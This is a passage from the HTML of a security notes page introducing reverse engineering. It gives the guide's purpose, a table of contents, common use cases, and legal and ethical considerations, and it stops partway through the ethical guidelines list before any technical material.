<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-intel-codex docs-version-current docs-doc-page docs-doc-id-Security/Analysis/sop-reverse-engineering" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Reverse Engineering | gl0bal01 | Notes &amp; Research</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" property="og:image" content="https://gl0bal01.com/img/lama.jpg"><meta data-rh="true" name="twitter:image" content="https://gl0bal01.com/img/lama.jpg"><meta data-rh="true" property="og:url" content="https://gl0bal01.com/intel-codex/Security/Analysis/sop-reverse-engineering"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="keywords" content="cybersecurity, osint, digital forensics, penetration testing, reverse engineering, malware analysis, AI security, intelligence gathering"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-intel-codex-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-intel-codex-current"><meta data-rh="true" property="og:title" content="Reverse Engineering | gl0bal01 | Notes &amp; Research"><meta data-rh="true" name="description" content="Binary reverse engineering: Ghidra, IDA Pro, disassembly, decompilation, debugging &amp; exploit development for security research and CTF challenges."><meta data-rh="true" property="og:description" content="Binary reverse engineering: Ghidra, IDA Pro, disassembly, decompilation, debugging &amp; exploit development for security research and CTF challenges."><link data-rh="true" rel="icon" href="/icons/favicon.ico"><link data-rh="true" rel="canonical" href="https://gl0bal01.com/intel-codex/Security/Analysis/sop-reverse-engineering"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/intel-codex/Security/Analysis/sop-reverse-engineering" hreflang="en"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/intel-codex/Security/Analysis/sop-reverse-engineering" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://4X4QPM0QJE-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Security & Analysis","item":"https://gl0bal01.com/intel-codex/category/security--analysis"},{"@type":"ListItem","position":2,"name":"Analysis","item":"https://gl0bal01.com/intel-codex/category/analysis"},{"@type":"ListItem","position":3,"name":"Reverse Engineering","item":"https://gl0bal01.com/intel-codex/Security/Analysis/sop-reverse-engineering"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="gl0bal01 Blog - Security Research &amp; Human Psychology RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="gl0bal01 Blog - Security Research &amp; Human Psychology Atom Feed">

<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NFE7MZ9S3P"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-NFE7MZ9S3P",{anonymize_ip:!0})</script>



<link rel="search" type="application/opensearchdescription+xml" title="gl0bal01 | Notes &amp; Research" href="/opensearch.xml">




<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
<link rel="preconnect" href="https://4X4QPM0QJE-dsn.algolia.net" crossorigin="anonymous">
<link rel="preconnect" href="https://www.googletagmanager.com">
<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="dns-prefetch" href="https://fonts.googleapis.com">
<link rel="dns-prefetch" href="https://www.googletagmanager.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Host+Grotesk:wght@600;800&amp;display=swap"><link rel="stylesheet" href="/assets/css/styles.a89a0862.css">
<script src="/assets/js/runtime~main.4092ebe3.js" defer="defer"></script>
<script src="/assets/js/main.48eeb4d3.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/icons/android-icon-48x48.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">gl0bal01</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" aria-label="Intel Codex documentation" href="/intel-codex">Intel Codex</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link" aria-label="Practical resources navigation menu">Practical</a><ul class="dropdown__menu"><li><a class="dropdown__link" aria-label="OSINT resources" href="/osint">Osint</a></li><li><a class="dropdown__link" aria-label="Cybersecurity resources" href="/cyber">Cyber</a></li><li><a class="dropdown__link" aria-label="Reverse engineering resources" href="/reverse-engineering">Reverse</a></li><li><a class="dropdown__link" aria-label="AI and machine learning resources" href="/ai">AI</a></li></ul></div><a class="navbar__item navbar__link" aria-label="Security and development cheatsheets" href="/cheatsheets">Cheatsheets</a><a class="navbar__item navbar__link" aria-label="Blog posts and articles" href="/blog">Blog</a><a class="navbar__item navbar__link" aria-label="Latest news and updates" href="/news">News</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/gl0bal01" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link header-github-link" aria-label="GitHub repository"></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Meta+k)" aria-keyshortcuts="Meta+k"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="8" stroke="currentColor" fill="none" stroke-width="1.4"></circle><path d="m21 21-4.3-4.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/intel-codex"><span title="Intel Codex Overview" class="linkLabel_WmDU">Intel Codex Overview</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/intel-codex/category/investigations"><span title="Investigations" class="categoryLinkLabel_W154">Investigations</span></a><button aria-label="Collapse sidebar category &#x27;Investigations&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Investigations-Index"><span title="Investigation Index" class="linkLabel_WmDU">Investigation Index</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/intel-codex/category/platform-guides"><span title="Platform Guides" class="categoryLinkLabel_W154">Platform Guides</span></a><button aria-label="Collapse sidebar category &#x27;Platform Guides&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/Platforms-Index"><span title="Platform Investigation SOPs" class="linkLabel_WmDU">Platform Investigation SOPs</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-bluesky"><span title="Bluesky SOP" class="linkLabel_WmDU">Bluesky SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-instagram"><span title="Instagram SOP" class="linkLabel_WmDU">Instagram SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-linkedin"><span title="LinkedIn SOP" class="linkLabel_WmDU">LinkedIn SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-reddit"><span title="Reddit SOP" class="linkLabel_WmDU">Reddit SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-telegram"><span title="Telegram SOP" class="linkLabel_WmDU">Telegram SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-tiktok"><span title="TikTok SOP" class="linkLabel_WmDU">TikTok SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-twitter-x"><span title="Twitter/X SOP" class="linkLabel_WmDU">Twitter/X SOP</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/intel-codex/category/investigation-techniques"><span title="Investigation Techniques" class="categoryLinkLabel_W154">Investigation Techniques</span></a><button aria-label="Collapse sidebar category &#x27;Investigation Techniques&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/Techniques-Index"><span title="OSINT Investigation Techniques" class="linkLabel_WmDU">OSINT Investigation Techniques</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-collection-log"><span title="OSINT Collection Log &amp; Chain of Custody" class="linkLabel_WmDU">OSINT Collection Log &amp; Chain of Custody</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-entity-dossier"><span title="Entity Dossier Guide" class="linkLabel_WmDU">Entity Dossier Guide</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-financial-aml-osint"><span title="Financial Crime &amp; AML OSINT" class="linkLabel_WmDU">Financial Crime &amp; AML OSINT</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-image-video-osint"><span title="Image &amp; Video OSINT" class="linkLabel_WmDU">Image &amp; Video OSINT</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-legal-ethics"><span title="Legal, Ethics &amp; Data Governance for OSINT" class="linkLabel_WmDU">Legal, Ethics &amp; Data Governance for OSINT</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-opsec-plan"><span title="OPSEC Planning for OSINT Investigations" class="linkLabel_WmDU">OPSEC Planning for OSINT Investigations</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-reporting-packaging-disclosure"><span title="Reporting, Packaging &amp; Disclosure" class="linkLabel_WmDU">Reporting, Packaging &amp; Disclosure</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-sensitive-crime-intake-escalation"><span title="Sensitive Crime Intake &amp; Escalation" class="linkLabel_WmDU">Sensitive Crime Intake &amp; Escalation</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-web-dns-whois-osint"><span title="Web, DNS &amp; WHOIS OSINT" class="linkLabel_WmDU">Web, DNS &amp; WHOIS OSINT</span></a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/intel-codex/category/security--analysis"><span title="Security &amp; Analysis" class="categoryLinkLabel_W154">Security &amp; Analysis</span></a><button aria-label="Collapse sidebar category &#x27;Security &amp; Analysis&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/intel-codex/category/analysis"><span title="Analysis" class="categoryLinkLabel_W154">Analysis</span></a><button aria-label="Collapse sidebar category &#x27;Analysis&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/Analysis-Index"><span title="Security Analysis SOPs" class="linkLabel_WmDU">Security Analysis SOPs</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-ai-vulnerability-evasion"><span title="AI/ML Vulnerability &amp; Evasion Testing SOP" class="linkLabel_WmDU">AI/ML Vulnerability &amp; Evasion Testing SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-cryptography-analysis"><span title="Cryptography Analysis SOP" class="linkLabel_WmDU">Cryptography Analysis SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-forensics-investigation"><span title="Digital Forensics Investigation SOP" class="linkLabel_WmDU">Digital Forensics Investigation SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-hash-generation-methods"><span title="Hash Generation Methods for Evidence Integrity" class="linkLabel_WmDU">Hash Generation Methods for Evidence Integrity</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-malware-analysis"><span title="Malware Analysis SOP" class="linkLabel_WmDU">Malware Analysis SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/intel-codex/Security/Analysis/sop-reverse-engineering"><span title="Reverse Engineering" class="linkLabel_WmDU">Reverse Engineering</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/intel-codex/category/penetration-testing"><span title="Penetration Testing" class="categoryLinkLabel_W154">Penetration Testing</span></a><button aria-label="Collapse sidebar category &#x27;Penetration Testing&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/Pentesting-Index"><span title="Pentesting SOPs" class="linkLabel_WmDU">Pentesting SOPs</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-ad-pentest"><span title="Active Directory Pentesting SOP (Authorized)" class="linkLabel_WmDU">Active Directory Pentesting SOP (Authorized)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-bug-bounty"><span title="Bug Bounty Methodology SOP" class="linkLabel_WmDU">Bug Bounty Methodology SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-detection-evasion-testing"><span title="Detection &amp; Evasion Testing SOP (Purple Team)" class="linkLabel_WmDU">Detection &amp; Evasion Testing SOP (Purple Team)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering"><span title="Firmware Reverse Engineering" class="linkLabel_WmDU">Firmware Reverse Engineering</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-linux-pentest"><span title="Linux Pentesting SOP (Authorized)" class="linkLabel_WmDU">Linux Pentesting SOP (Authorized)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-mobile-security"><span title="Mobile Security (iOS &amp; Android)" class="linkLabel_WmDU">Mobile Security (iOS &amp; Android)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-vulnerability-research"><span title="Vulnerability Research SOP" class="linkLabel_WmDU">Vulnerability Research SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-web-application-security"><span title="Web Application Security Testing SOP" class="linkLabel_WmDU">Web Application Security Testing SOP</span></a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Security-Index"><span title="Security Index" class="linkLabel_WmDU">Security Index</span></a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/intel-codex/category/security--analysis"><span>Security &amp; Analysis</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/intel-codex/category/analysis"><span>Analysis</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Reverse Engineering</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><div class="theme-admonition theme-admonition-danger admonition_xJq3 alert alert--danger"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>Synced from an <strong>Obsidian vault</strong></div><div class="admonitionContent_BuS1"><p>For graph and advanced features, download the <strong>full</strong> <strong><a href="https://github.com/gl0bal01/intel-codex" target="_blank" rel="noopener noreferrer" class="">Intel Codex Vault</a></strong> and open it in <strong>Obsidian</strong>.</p></div></div>
<header><h1>Reverse Engineering</h1></header>
<blockquote>
<p><strong>Purpose:</strong> Comprehensive guide to reverse engineering binaries, understanding assembly code, bypassing protections, and developing exploits for security research, malware analysis, and CTF competitions.</p>
</blockquote>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="table-of-contents">Table of Contents<a href="#table-of-contents" class="hash-link" aria-label="Direct link to Table of Contents" title="Direct link to Table of Contents" translate="no">​</a></h2>
<ol>
<li class=""><a href="#overview" class="">Overview</a></li>
<li class=""><a href="#reverse-engineering-fundamentals" class="">Reverse Engineering Fundamentals</a></li>
<li class=""><a href="#static-analysis" class="">Static Analysis</a></li>
<li class=""><a href="#dynamic-analysis" class="">Dynamic Analysis</a></li>
<li class=""><a href="#platform-specific-reversing" class="">Platform-Specific Reversing</a></li>
<li class=""><a href="#anti-reversing-techniques" class="">Anti-Reversing Techniques</a></li>
<li class=""><a href="#exploit-development" class="">Exploit Development</a></li>
<li class=""><a href="#practical-workflows" class="">Practical Workflows</a></li>
<li class=""><a href="#tools-reference" class="">Tools Reference</a></li>
</ol>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-reverse-engineering">What is Reverse Engineering?<a href="#what-is-reverse-engineering" class="hash-link" aria-label="Direct link to What is Reverse Engineering?" title="Direct link to What is Reverse Engineering?" translate="no">​</a></h3>
<p><strong>Reverse engineering</strong> is the process of analyzing a compiled binary (executable, library, firmware) to understand its functionality, identify vulnerabilities, or modify its behavior without access to source code.</p>
<p><strong>Common use cases:</strong></p>
<ul>
<li class=""><strong>Malware analysis:</strong> Understanding malicious binaries</li>
<li class=""><strong>Vulnerability research:</strong> Finding security flaws in proprietary software</li>
<li class=""><strong>Exploit development:</strong> Creating proof-of-concept exploits for vulnerabilities</li>
<li class=""><strong>CTF competitions:</strong> Solving binary exploitation and reverse engineering challenges</li>
<li class=""><strong>Software auditing:</strong> Verifying security of closed-source applications</li>
<li class=""><strong>License verification:</strong> Analyzing software protection mechanisms (ethical use only)</li>
<li class=""><strong>Interoperability:</strong> Understanding proprietary protocols or file formats</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="legal--ethical-considerations">Legal &amp; Ethical Considerations<a href="#legal--ethical-considerations" class="hash-link" aria-label="Direct link to Legal &amp; Ethical Considerations" title="Direct link to Legal &amp; Ethical Considerations" translate="no">​</a></h3>
<p><strong>Legal risks:</strong></p>
<ul>
<li class=""><strong>DMCA Section 1201 (US):</strong> Prohibits circumventing technological protection measures (DRM, software activation)</li>
<li class=""><strong>Computer Fraud and Abuse Act (CFAA):</strong> Unauthorized access to computer systems</li>
<li class=""><strong>Software license agreements:</strong> May prohibit reverse engineering (enforceability varies)</li>
<li class=""><strong>Copyright law:</strong> Reverse engineering for interoperability generally permitted (fair use)</li>
</ul>
<p><strong>Ethical guidelines:</strong></p>
<ul>
<li class="">✅ Reverse engineering for security research (responsible disclosure)</li>
<li class="">✅ Analyzing malware in isolated environments</li>
<li class="">✅ CTF competitions and educational challenges</li>
<li class="">✅ Interoperability and compatibility research</li>
